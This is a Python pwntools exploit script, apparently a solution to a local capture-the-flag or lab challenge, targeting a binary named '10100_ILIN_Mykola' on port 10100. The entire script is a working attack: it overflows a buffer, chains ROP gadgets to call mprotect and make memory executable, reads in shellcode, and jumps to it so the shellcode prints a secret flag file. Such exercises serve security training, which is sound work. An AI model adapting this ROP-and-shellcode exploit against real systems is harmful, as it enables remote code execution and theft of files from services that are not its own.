#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

sc = asm(shellcraft.cat('10100_ILIN_Mykola.secret') + shellcraft.echo('\n') + shellcraft.exit(13))

#r = process('./10100_ILIN_Mykola')
#r = process('/usr/sbin/chroot /bv_mkr1/10100 ./10100_ILIN_Mykola', shell=True)
r = remote('127.0.0.1', 10100)

buf = b'A'*336
buf += p32(1337)
buf = buf.ljust(1672, b'B')

prax = p64(0x00449857) # pop rax ; ret
prdi = p64(0x0048ef07) # pop rdi ; ret
prsi = p64(0x00486617) # pop rsi ; ret
prdx = p64(0x0040181f) # pop rdx ; ret
syscall = p64(0x00417454) # syscall ; ret

rwx = 0x400000

# mprotect(rwx, 0x1000, 7)

# rax = 0xa, mprotect syscall
buf += prax
buf += p64(5)
buf += prdi
buf += p64(5)
buf += p64(0x0042a404) # add eax, edi ; ret

# rdi = buffer for shellcode
buf += prdi
buf += p64(rwx)

# rsi = 0x1000 buffer size
buf += prsi
buf += p64(0x1000)

# rdx = 7, RWX
buf += prdx
buf += p64(7)

buf += syscall

# read(0, buf, sizeof sc)
buf += prax
buf += p64(0)
buf += prdi
buf += p64(0)
buf += prsi
buf += p64(rwx)
buf += prdx
buf += p64(len(sc))
buf += syscall

# jump to buf
buf += p64(rwx)

log.info('=== buffer')
print(hexdump(buf))

#pause()
r.readline()
r.writeline(buf)
r.readuntil('GRANTED!')

log.info('=== shellcode')
print(hexdump(sc))
r.writeline(sc)

#r.interactive()
log.success(f'FLAG {r.readall().strip().decode("ascii")}')
